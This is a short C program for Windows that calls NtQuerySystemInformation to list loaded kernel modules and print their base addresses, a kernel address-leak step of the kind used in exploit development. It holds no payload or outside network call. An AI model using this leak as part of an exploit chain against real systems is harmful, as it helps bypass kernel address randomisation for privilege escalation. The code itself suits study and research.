#include "leak_addresses.h"

int main(int argc, char** argv)
{
	char unused = 0;
	HMODULE h_ntdll = 0;
	NtQuerySystemInformation _NtQuerySystemInformation = 0;
	unsigned long return_length = 0;
	NTSTATUS status = 0;
	PSYSTEM_MODULE_INFORMATION module_info;

	printf("[!] Lets leak some kernel base addresses!");

	h_ntdll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
	if (!h_ntdll)
	{
		printf("\n[-] Failed to load the \"ntdll.dll\" API library. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Loaded the \"ntdll.dll\" API library. Handle Value: 0x%p", h_ntdll);

	_NtQuerySystemInformation = (NtQuerySystemInformation)GetProcAddress(h_ntdll, "NtQuerySystemInformation");
	if (!_NtQuerySystemInformation)
	{
		printf("\n[-] Failed to locate the \"NtQuerySystemInformation\" function. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Located the \"NtQuerySystemInformation\" function. Function Address: 0x%p", _NtQuerySystemInformation);

	_NtQuerySystemInformation(SystemModuleInformation, 0, 0, &return_length);
	module_info = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(0, return_length, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	status = _NtQuerySystemInformation(SystemModuleInformation, module_info, return_length, &return_length);
	if (status)
	{
		printf("\n[-] Failed to query system module information. NTSTATUS: %d (0x%x)", status, status);
		unused = getchar();
		return 0;
	}
	printf("\n[+] Queried system module information. NTSTATUS: %d (0x%x)", status, status);

	printf("\n[*] Leaking kernel base addresses...");
	if (module_info)
	{
		for (int i = 0; i < module_info->ModulesCount; i++)
		{
			printf("\n[!] Leaked \"%s\" kernel base address. Kernel Image Address: 0x%p, Kernel Image Size: 0x%p", module_info->Modules[i].Name, module_info->Modules[i].ImageBaseAddress, module_info->Modules[i].ImageSize);
		}
	}
	printf("\n[+] Leaked all kernel base addresses.");

	unused = getchar();
	return 0;
}